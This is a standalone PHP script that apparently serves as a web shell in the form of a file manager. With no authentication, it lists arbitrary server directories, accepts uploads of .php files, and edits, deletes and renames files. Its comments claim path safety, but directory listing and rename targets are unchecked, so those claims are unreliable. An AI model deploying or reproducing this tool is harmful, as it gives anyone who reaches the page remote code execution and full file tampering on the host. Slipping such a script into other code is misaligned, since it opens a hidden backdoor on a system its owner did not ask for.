<?php
$uploadDir = __DIR__; // Directory where files are uploaded

// Function to validate the directory path to ensure it remains within a safe boundary
function is_safe_path($path, $base) {
    $realBase = realpath($base);
    $realPath = realpath($path);
    return $realPath && strpos($realPath, $realBase) === 0; // Ensure path is within allowed directory
}

// Function to edit a file
if (isset($_GET['edit']) && is_file($_GET['edit']) && is_safe_path($_GET['edit'], $uploadDir)) {
    $filePath = $_GET['edit'];

    if (isset($_POST['content'])) {
        // Save the content to the file
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('File has been saved');</script>";
    }

    // Display the file editor
    echo '<form method="POST">';
    echo '<textarea name="content" style="width:100%;height:300px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea>';
    echo '<br><input type="submit" value="Save">';
    echo '</form>';
    exit;
}

// Function to upload a file
if (isset($_FILES['upload'])) {
    $uploadName = basename($_FILES['upload']['name']); // Get the original file name
    $uploadTmp = $_FILES['upload']['tmp_name'];

    // Check if a file with the same name already exists, if so, generate a new name
    $uploadPath = "$uploadDir/$uploadName";
    if (file_exists($uploadPath)) {
        $uploadName = time() . '_' . $uploadName; // Add a timestamp to avoid duplication
        $uploadPath = "$uploadDir/$uploadName";
    }

    // Define allowed file extensions
    $allowedExtensions = ['php', 'html', 'txt', 'jpg', 'png', 'jpeg', 'gif'];
    $fileExtension = strtolower(pathinfo($uploadName, PATHINFO_EXTENSION));

    // Check if the file extension is allowed
    if (in_array($fileExtension, $allowedExtensions)) {
        // Save the uploaded file
        move_uploaded_file($uploadTmp, $uploadPath);

        echo "<script>alert('File uploaded successfully');</script>";
    } else {
        echo "<script>alert('File extension not allowed');</script>";
    }
}

// Function to delete a file or folder
if (isset($_GET['delete']) && is_safe_path($_GET['delete'], $uploadDir)) {
    $deletePath = $_GET['delete'];

    if (is_file($deletePath)) {
        unlink($deletePath); // Delete the file
        echo "<script>alert('File deleted successfully');</script>";
    } elseif (is_dir($deletePath)) {
        rmdir($deletePath); // Delete the folder (folder must be empty)
        echo "<script>alert('Folder deleted successfully');</script>";
    }
}

// Function to rename a file or folder
if (isset($_GET['rename']) && isset($_POST['newName']) && is_safe_path($_GET['rename'], $uploadDir)) {
    $oldPath = $_GET['rename'];
    $newName = $_POST['newName'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;

    if (rename($oldPath, $newPath)) {
        echo "<script>alert('File or folder renamed successfully');</script>";
    } else {
        echo "<script>alert('Failed to rename file or folder');</script>";
    }
}

// Function to convert file permissions to octal format
function getFilePermissions($file) {
    $permissions = fileperms($file);

    // If it's a directory, add 040000
    if (is_dir($file)) {
        $permissions |= 0x4000;
    }

    // Convert permissions to octal format
    return substr(decoct($permissions), -4);
}

// Display the file and folder list in the current directory
$dir = isset($_GET['d']) ? $_GET['d'] : $uploadDir;
$files = scandir($dir);

// Function to display breadcrumb path like shell pwd
function show_pwd($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $path = '';
    $pwd = '';

    foreach ($parts as $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        $pwd .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}

echo '<form method="POST" enctype="multipart/form-data">';
echo '<input type="file" name="upload">';
echo '<input type="submit" value="Upload">';
echo '</form>';

echo '<h2>Current Directory (PWD)</h2>';
echo '<p>' . show_pwd($dir) . '</p>';

echo '<ul>';
if ($dir !== $uploadDir) {
    // Button to go back to the previous directory
    echo '<li><a href="?d=' . urlencode(dirname($dir)) . '">.. (Go Back)</a></li>';
}

// Button to go back to the root directory (where files are uploaded)
echo '<li><a href="?d=' . urlencode($uploadDir) . '">Back to Root Directory</a></li>';

foreach ($files as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = realpath("$dir/$f");

    // Display file permissions in octal format
    $permissions = getFilePermissions($path);

    if (is_dir($path)) {
        echo "<li>[DIR] <a href='?d=" . urlencode($path) . "'>$f</a> 
                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this folder?\");'>[Delete]</a> 
                <span>Permissions: $permissions</span></li>";
    } else {
        echo "<li>[FILE] <a href='?d=" . urlencode($dir) . "&edit=" . urlencode($path) . "'>$f</a> 
                <a href='?d=" . urlencode($dir) . "&delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete this file?\");'>[Delete]</a>
                <a href='?d=" . urlencode($dir) . "&rename=" . urlencode($path) . "'>[Rename]</a>
                <span>Permissions: $permissions</span></li>";
    }
}
echo '</ul>';

if (isset($_GET['rename'])) {
    $renamePath = $_GET['rename'];
    echo '<form method="POST">';
    echo 'New Name: <input type="text" name="newName" value="' . basename($renamePath) . '">';
    echo '<input type="submit" value="Rename">';
    echo '</form>';
}
?>
